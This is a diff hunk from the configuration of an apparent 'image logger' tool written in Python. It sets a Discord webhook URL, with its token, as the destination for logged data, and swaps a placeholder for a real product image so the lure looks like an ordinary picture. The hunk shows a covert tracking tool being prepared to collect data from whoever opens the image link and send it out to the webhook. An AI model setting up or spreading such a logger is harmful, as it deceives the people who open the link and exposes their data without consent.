@@ -12,7 +12,7 @@ __author__ = "Joe Mama"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1450230920643875129/x1L-ztvXv-Wxz5ml2qwFKYB75nuF6A-OfUK7X9imScZtPDswywxAqPYO7LbY3DZIcZzt",
-    "image": "https://link-to-your-image.here", # You can also have a custom image by using a URL argument
+    "image": "https://zo.nice-cdn.com/upload/image/product/large/default/12542_7280676e.1024x1024.png", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
